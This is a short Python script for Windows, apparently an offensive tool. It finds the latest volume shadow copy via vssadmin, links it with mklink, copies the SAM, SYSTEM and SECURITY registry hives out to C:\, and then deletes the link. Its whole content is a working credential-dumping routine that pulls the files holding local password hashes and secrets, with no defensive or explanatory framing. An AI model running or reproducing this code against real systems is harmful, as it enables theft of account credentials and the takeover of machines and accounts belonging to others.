import subprocess
import os
import shutil
 
def getLastShadow():
    output = subprocess.check_output(["%systemroot%\\sysnative\\cmd.exe", "/c", "vssadmin", "list", "shadows"], shell=True)
    strMarker = "Shadow Copy Volume: "
    list = []
    for line in output.split('\n'):
        if strMarker in line:
            list.append(line[line.index(strMarker) + len(strMarker):])
     
    return list[-1]
 
def mountShadowFile(shadowFile):
    shadowFile += "\\"
    FNULL = open(os.devnull, 'w')
    subprocess.call(["mklink", "/d", "c:\Folder0", shadowFile], shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
     
def extractHives():
    fileList = os.listdir('C:\Folder0\Windows\System32\config')
     
    for file in fileList:
        if file == "SAM" or file == "SYSTEM" or file == "SECURITY":
            file = 'C:\Folder0\Windows\System32\config\\'+file
            shutil.copy2(file, "C:\\")
 
def removeLink():
    subprocess.call(["rmdir", "/Q", "/S", "C:\Folder0"], shell=True)
 
def main():
    lastShadowFile = getLastShadow()
    mountShadowFile(lastShadowFile)
    extractHives()
    removeLink()
 
if __name__ == '__main__':
  main()
